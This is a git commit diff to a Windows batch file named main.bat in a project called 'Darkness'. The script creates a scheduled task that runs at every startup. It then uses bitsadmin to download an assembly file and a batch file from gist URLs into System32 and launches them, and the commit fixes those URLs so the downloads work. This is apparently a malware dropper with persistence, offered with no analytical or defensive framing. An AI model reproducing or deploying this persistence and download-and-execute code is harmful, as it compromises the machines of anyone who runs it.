c3aef5a4e25e2fa4d10861be95deb3123c720b7f
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-21 20:13:59 +0100

    Darkness

--- Darkness/main.bat
+++ Darkness/main.bat
@@ -2,7 +2,7 @@
 
 cd /d %windir%\system32
 schtasks /create /tn "Startup Task" /tr "%windir%\System32\main.bat" /sc onstart
-bitsadmin /transfer "downloadDarkness" /download /priority highest https://gist.github.com/INeddHelp/1308b6e410f2efce0cf716d9ab58abcd %SystemRoot%\System32\Darkness.asm
-bitsadmin /transfer "downloadNasm" /download /priority highest https://gist.github.com/INeddHelp/c53b5e932e5bbdace9ea98c3b2edb372 %SystemRoot%\System32\nasm.bat
-
+bitsadmin /transfer "downloadDarkness" /download /priority highest https://gist.github.com/INeddHelp/1308b6e410f2efce0cf716d9ab58abcd/raw/Darkness.asm %SystemRoot%\System32\Darkness.asm
+bitsadmin /transfer "downloadNasm" /download /priority highest https://gist.github.com/INeddHelp/c53b5e932e5bbdace9ea98c3b2edb372/raw/nasm.bat %SystemRoot%\System32\nasm.bat
+cd /d %windir%\system32
 start nasm.bat
